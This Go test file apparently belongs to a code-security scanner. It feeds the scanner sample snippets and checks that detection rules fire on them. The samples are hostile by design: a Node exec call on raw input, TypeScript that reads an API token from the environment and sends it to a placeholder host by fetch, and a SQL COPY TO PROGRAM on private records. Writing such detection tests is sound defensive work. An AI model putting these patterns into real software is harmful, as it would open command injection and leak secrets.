package nativecheck

import (
	"context"
	"errors"
	"strings"

	"github.com/skarm/scout"
	"github.com/skarm/scout/internal/syntax/language"
	"github.com/skarm/scout/internal/syntax/parse"
	"github.com/skarm/scout/internal/syntax/scriptsyntax"
	"github.com/skarm/scout/internal/syntax/source"
)

func (s *nativeSuite) languageChecks() {
	for _, tc := range []struct{ language, file, code, rule, invalid string }{
		{
			language: language.JavaScript,
			file:     "sentinel.js",
			code:     `const {exec:run}=require('node:child_process'); run(input);`,
			rule:     "JS001",
			invalid:  `const value = (`,
		},
		{
			language: language.TypeScript,
			file:     "sentinel.ts",
			code:     `const key: string=process.env.API_TOKEN; fetch('https://receiver.invalid', {body:key});`,
			rule:     "JS003",
			invalid:  `const value: =`,
		},
		{
			language: language.SQL,
			file:     "sentinel.sql",
			code:     `COPY (SELECT * FROM private_records) TO PROGRAM 'inert';`,
			rule:     "SQL003",
			invalid:  `SELECT 'unterminated`,
		},
	} {
		available := tc.language == language.SQL || scriptsyntax.Available()
		s.add(tc.language+"-tree", tc.language, available, func() bool {
			view, err := source.NewView(tc.code, []source.Span{{Start: 0, End: len(tc.code)}})
			if err != nil {
				return false
			}

			b, ok := parse.Defaults().Lookup(tc.language)
			if !ok {
				return false
			}

			tree, err := b.Parse(s.ctx, view)

			return tree != nil && err == nil
		})
		s.add(tc.language+"-syntax", tc.language, available, func() bool {
			view, err := source.NewView(tc.invalid, []source.Span{{Start: 0, End: len(tc.invalid)}})
			if err != nil {
				return false
			}

			b, ok := parse.Defaults().Lookup(tc.language)
			if !ok {
				return false
			}

			_, err = b.Parse(s.ctx, view)

			return err != nil
		})
		s.add(tc.language+"-flow", tc.language, available, func() bool { return languageFinding(s.ctx, tc.file, tc.code, tc.rule) })
	}
}

func languageFinding(ctx context.Context, name, text, rule string) bool {
	opts := scout.DefaultOptions()
	opts.Profile = scout.Custom
	opts.Checks = &scout.Checks{}

	scanner, err := scout.New(ctx, opts)
	if err != nil {
		return false
	}
	defer func() { _ = scanner.Close() }()

	run, err := scanner.Scan(ctx, scout.Reader(name, strings.NewReader(text)))
	if err != nil && !errors.Is(err, scout.ErrIncomplete) || len(run.Targets) != 1 {
		return false
	}

	for _, f := range run.Targets[0].Analysis.Findings {
		if f.RuleID == rule && f.Evidence.SpanSHA256 != "" {
			return true
		}
	}

	return false
}
